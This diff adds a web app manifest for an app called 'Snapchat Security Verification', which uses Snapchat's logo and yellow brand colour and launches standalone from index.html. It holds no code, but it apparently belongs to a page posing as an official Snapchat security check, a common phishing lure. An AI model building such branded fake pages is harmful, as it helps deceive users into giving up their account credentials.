@@ -1,0 +1,15 @@
+{
+  "short_name": "Snapchat",
+  "name": "Snapchat Security Verification",
+  "icons": [
+    {
+      "src": "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/600px-Snapchat_logo.svg.png",
+      "sizes": "512x512",
+      "type": "image/png"
+    }
+  ],
+  "start_url": "index.html",
+  "display": "standalone",
+  "background_color": "#FFFC00",
+  "theme_color": "#FFFC00"
+}
